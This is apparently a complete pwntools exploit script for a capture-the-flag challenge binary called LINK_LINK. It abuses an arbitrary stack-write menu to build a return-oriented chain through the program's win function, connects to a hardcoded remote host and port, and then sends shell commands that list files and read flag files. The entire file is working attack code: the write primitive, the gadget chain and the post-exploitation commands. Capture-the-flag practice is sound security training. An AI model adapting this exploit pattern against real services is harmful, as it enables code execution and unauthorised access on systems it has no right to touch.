
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./LINK_LINK", checksec=False)
context.arch = "amd64"
context.log_level = "info"

HOST = "103.152.242.90"
PORT = 23354

rop = ROP(elf)
RET = rop.find_gadget(["ret"]).address
WIN = elf.symbols["win"]
EXIT = elf.plt["exit"]

io = remote(HOST, PORT) if args.REMOTE else process(elf.path)

def write_value(offset, value):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Slot (0-3): ", b"0")
    io.sendline(str(offset).encode())

    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Slot (0-3): ", b"0")
    io.sendline(str(value).encode())

log.info(f"RET  = {RET:#x}")
log.info(f"WIN  = {WIN:#x}")
log.info(f"EXIT = {EXIT:#x}")

write_value(0xA0, RET)
write_value(0xA8, WIN)
write_value(0xB0, RET)
write_value(0xB8, EXIT)

io.sendlineafter(b"> ", b"5")
io.recvuntil(b"Bye.\n", timeout=5)

io.sendline(
    b"id; pwd; ls -la; "
    b"cat /flag /flag.txt ./flag.txt 2>/dev/null; exit"
)

print(io.recvall(timeout=5).decode(errors="replace"))
io.close()
